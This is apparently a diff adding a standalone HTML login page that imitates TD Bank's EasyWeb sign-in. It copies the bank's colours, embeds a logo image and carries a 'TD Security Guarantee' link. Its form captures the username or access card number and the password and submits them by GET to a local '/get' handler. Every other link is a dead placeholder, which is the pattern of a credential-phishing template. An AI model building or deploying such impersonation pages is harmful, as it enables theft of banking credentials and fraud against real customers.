@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: 'Segoe UI', 'Arial', sans-serif;
+    background: linear-gradient(135deg, #00a64f 0%, #008542 100%);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  .login-wrapper {
+    width: 100%;
+    max-width: 440px;
+  }
+
+  .login-container {
+    background: #ffffff;
+    padding: 40px;
+    border-radius: 8px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+  }
+
+  .logo-container {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  #logo {
+    width: 89px;
+    height: 78px;
+    display: block;
+    margin: 0 auto 20px;
+  }
+
+  .g-h1 {
+    font-size: 28px;
+    text-align: center;
+    color: #00a64f;
+    font-weight: 300;
+    margin-bottom: 30px;
+    line-height: 1.3;
+    letter-spacing: 0.5px;
+  }
+
+  .form-group {
+    margin-bottom: 20px;
+  }
+
+  .form-label {
+    display: block;
+    font-size: 14px;
+    color: #333333;
+    margin-bottom: 6px;
+    font-weight: 500;
+  }
+
+  .g-input {
+    width: 100%;
+    height: 48px;
+    padding: 0 14px;
+    border: 2px solid #d1d1d1;
+    border-radius: 4px;
+    font-size: 16px;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .g-input:focus {
+    outline: none;
+    border-color: #00a64f;
+    box-shadow: 0 0 0 3px rgba(0, 166, 79, 0.1);
+  }
+
+  .g-input::placeholder {
+    color: #999999;
+  }
+
+  .gbtn-primary {
+    width: 100%;
+    height: 50px;
+    background-color: #00a64f;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    margin-top: 25px;
+    transition: background-color 0.2s;
+  }
+
+  .gbtn-primary:hover {
+    background-color: #008f45;
+  }
+
+  .gbtn-primary:active {
+    transform: translateY(1px);
+  }
+
+  .forgot-password {
+    display: block;
+    text-align: center;
+    margin-top: 20px;
+    color: #00a64f;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+  }
+
+  .forgot-password:hover {
+    text-decoration: underline;
+  }
+
+  .security-note {
+    text-align: center;
+    margin-top: 25px;
+    padding-top: 25px;
+    border-top: 1px solid #e5e5e5;
+  }
+
+  .create-account {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    color: #666666;
+    text-decoration: none;
+    font-size: 13px;
+  }
+
+  .lock-icon {
+    font-size: 13px;
+    color: #00a64f;
+  }
+
+  .help-text {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 13px;
+    color: #666666;
+  }
+
+  .help-text a {
+    color: #00a64f;
+    text-decoration: none;
+  }
+
+  .help-text a:hover {
+    text-decoration: underline;
+  }
+
+  @media (max-width: 480px) {
+    .login-container {
+      padding: 30px 20px;
+    }
+
+    .g-h1 {
+      font-size: 24px;
+      margin-bottom: 25px;
+    }
+
+    #logo {
+      width: 50px;
+    }
+
+    .g-input {
+      height: 46px;
+      font-size: 16px;
+    }
+
+    .gbtn-primary {
+      height: 48px;
+      font-size: 16px;
+    }
+  }
+</style>
+<title>Sign in to TD Bank</title>
+</head>
+<body>
+<div class="login-wrapper">
+  <div class="login-container">
+    <div class="logo-container">
+      <img id="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFkAAABOCAMAAAB8Bkq+AAAAWlBMVEUbsUwbsUwbsUwZsUsbsUwes1AbsUwEqTgAoSgApC4SrUMyt1pTwnRHvmo+vWcXr0ew5MH////6/vzv+vTf9eeH1qL1/fnF7NNkyYOi37Z1z5EAmRUAlAeP2af7SjnBAAAABXRSTlPT6Mz/3wIIN/wAAAIQSURBVHgB7JeH0rI6EED15i7LpoIJ/fP9H/PvmNUhFgx/5Uy3HM6kDofDcRv+OxzFNhw3M/+/m3fzbv5dzLCaYoloBixXQSQFwD1zofQKjFUOyxIB0mas6tMKfAhVY7GUcM+8mrbrkQBS5qF+h06RA042c+01yYS5qt+kJ5cwn66pL5xS3Iy2pcWdIq3mqDg4nTZ6kX6sPFd3EuFCYqfQ9DHWM9U0lR8XyivEwNUjuYXmAjgFnVkK2eaCchCRNI3MHBwumTkgqWHmaYxDalBEAHDi1T0lzJEbc580QylDNFfoXmyO5pO9McPURLNXOCtSzS+YS+ujWnPzu83Ih6OhjM1Xu3fI2QzEBrqSLl8zEFs5AWTOZh3NXs1fZ2k2np1KCN/J0Yz2BXOx2myyNqsXzMVmZsg9GpHNZhDWrjqfdW2QbqNZZW3uozmAzNk88uvb5Wwe+Ckq8jVL7PjJL/I1kwr88s7UHI/n+G22ZkkVn0CZr3kyng+zy9ZM1NURi2J9s0EBMw6nsmLiCqVY3wxTyVBdzTAk3mge9Rd6/ZW+6TwXDyQBYEXz7K4TBEcQebk5TVBRvK45LRawQbM/yyh+0Hx+3uzDWRFC5FGz/07duan3J79ICF3VGEco4Emzk8rMWCHBLGKtAonEvI/N/CWOBEhKgi5qnzIXEPn6oJdJmxk/xbybd/Nu3s3Hz6PdjBgAfXLhOFfKxNYAAAAASUVORK5CYII=" alt="">
+    </div>
+    
+    <h1 class="g-h1">Sign in to EasyWeb</h1>
+    
+    <form action="/get" method="get">
+      <div class="form-group">
+        <label for="email" class="form-label">Username or Access Card</label>
+        <input 
+          type="text" 
+          class="g-input" 
+          id="email"
+          name="email" 
+          autocomplete="username" 
+          required>
+      </div>
+
+      <div class="form-group">
+        <label for="password" class="form-label">Password</label>
+        <input 
+          type="password" 
+          class="g-input" 
+          id="password"
+          name="password" 
+          autocomplete="current-password" 
+          required 
+          minlength="8">
+      </div>
+
+      <button type="submit" class="gbtn-primary">
+        Login
+      </button>
+
+      <a href="#" class="forgot-password">Forgot your username or password?</a>
+
+      <div class="security-note">
+        <a href="#" class="create-account">
+          <span class="lock-icon">🔒</span>
+          <span>TD Security Guarantee</span>
+        </a>
+      </div>
+    </form>
+
+    <div class="help-text">
+      New to TD? <a href="#">Open an account</a>
+    </div>
+  </div>
+</div>
+</body>
+</html>
